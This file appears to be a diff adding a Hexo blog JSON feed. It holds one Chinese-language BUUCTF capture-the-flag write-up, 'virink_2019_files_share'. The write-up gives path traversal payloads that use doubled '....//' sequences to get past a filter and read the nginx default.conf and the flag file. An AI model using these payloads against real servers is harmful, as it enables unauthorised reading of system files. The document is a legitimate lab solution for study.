@@ -1,0 +1,19 @@
+{
+    "version": "https://jsonfeed.org/version/1",
+    "title": "Hexo • All posts by \"任意文件读取\" tag",
+    "description": "",
+    "home_page_url": "http://odiws.github.io",
+    "items": [
+        {
+            "id": "http://odiws.github.io/2024/09/24/virink-2019-files-share/",
+            "url": "http://odiws.github.io/2024/09/24/virink-2019-files-share/",
+            "title": "virink_2019_files_share",
+            "date_published": "2024-09-24T11:14:53.000Z",
+            "content_html": "<h2 id=\"virink_2019_files_share\"><a class=\"markdownIt-Anchor\" href=\"#virink_2019_files_share\">#</a> virink_2019_files_share</h2>\n<h2 id=\"4\"><a class=\"markdownIt-Anchor\" href=\"#4\">#</a> <img data-src=\"../images/%5B%E7%BE%8A%E5%9F%8E%E6%9D%AF2020%5DEasyphp2/4.png\" alt=\"4\"></h2>\n<p>进来就是 js 小游戏，没有什么提示说还原后才给 flag，所以可以直接信息搜集</p>\n<pre><code>&lt;head&gt;\n\t&lt;meta charset=&quot;UTF-8&quot;&gt;\n\t&lt;title&gt;The Cube&lt;/title&gt;\n\t&lt;meta name=&quot;viewport&quot;\n\t\tcontent=&quot;width=device-width,height=device-height,user-scalable=no,initial-scale=1.0,maximum-scale=1.0,minimum-scale=1.0&quot;&gt;\n\t&lt;link rel=&quot;stylesheet&quot; href=&quot;/static/style.css&quot;&gt;\n\t&lt;link rel=&quot;icon&quot; href=&quot;/uploads/favicon.ico&quot; type=&quot;image/x-icon&quot; /&gt;\n\t&lt;!-- Hint : flag in f1ag_Is_h3re --&gt;\n\t&lt;!-- 趣味题，真的是为了出题而出题的，别打我。 By Virink --&gt;\n&lt;/head&gt;\n</code></pre>\n<p>发现提示进去看看。<img data-src=\"../images/%5B%E7%BE%8A%E5%9F%8E%E6%9D%AF2020%5DEasyphp2/5.png\" alt=\"5\"></p>\n<p>任意文件读取（双写绕过过滤）：由于是使用 OpenResty，尝试包含 nginx 的配置文件，默认是 /etc/nginx/conf.d/default.conf<br>\n 尝试访问后发现过滤了…/, 所以使用双写绕过</p>\n<pre><code>/preview?f=....//....//....//....//....//....//....//etc..//nginx..//conf.d..//default.conf\n</code></pre>\n<p>然后根据提示访问 flag 文件</p>\n<pre><code>/preview?f=....//....//....//....//....//....//....//f1ag_Is_h3re..//flag\n</code></pre>\n<p><img data-src=\"../images/%5B%E7%BE%8A%E5%9F%8E%E6%9D%AF2020%5DEasyphp2/6.png\" alt=\"6\"> 参考链接：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MjYzOTUxL2FydGljbGUvZGV0YWlscy8xMTk1OTkzNjg=\">https://blog.csdn.net/qq_46263951/article/details/119599368</span></p>\n",
+            "tags": [
+                "buuctf",
+                "任意文件读取"
+            ]
+        }
+    ]
+}
